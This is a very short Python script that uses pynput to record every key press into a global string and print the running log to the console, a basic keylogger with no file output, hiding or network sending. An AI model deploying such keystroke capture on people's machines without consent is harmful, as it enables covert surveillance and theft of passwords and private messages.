import pynput.keyboard

stored_keys =" "

def keypress(key):
    global stored_keys
    stored_keys = stored_keys+str(key)
    print(stored_keys)

listener = pynput.keyboard.Listener(on_press=keypress)
with listener as key:
    key.join()
